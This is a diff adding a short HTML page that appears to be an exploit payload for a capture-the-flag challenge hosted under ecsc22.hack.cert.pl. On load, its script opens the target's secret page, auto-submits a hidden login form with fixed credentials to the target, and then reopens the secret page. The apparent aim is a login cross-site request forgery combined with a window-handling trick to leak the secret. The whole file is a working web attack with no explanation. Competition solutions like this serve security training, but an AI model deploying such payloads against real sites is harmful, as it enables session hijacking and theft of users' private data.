@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <form id="fr" name="fr" method="POST" target="_blank" action="https://monster.ecsc22.hack.cert.pl">
+      <input name="username" value="qwerty">
+      <input name="password" value="qwerty">
+      <button type="submit">sub</button>
+    </form>
+    
+    <script>
+      let secret_window = window.open("https://secret.monster.ecsc22.hack.cert.pl/secret", "secret");
+
+      setTimeout(() => {
+        document.querySelector("form").submit();
+        setTimeout(() => {
+          let our_window = window.open("https://secret.monster.ecsc22.hack.cert.pl/secret", "_blank");
+        }, 500);
+      }, 500);
+    </script>
+  </body>
+</html>
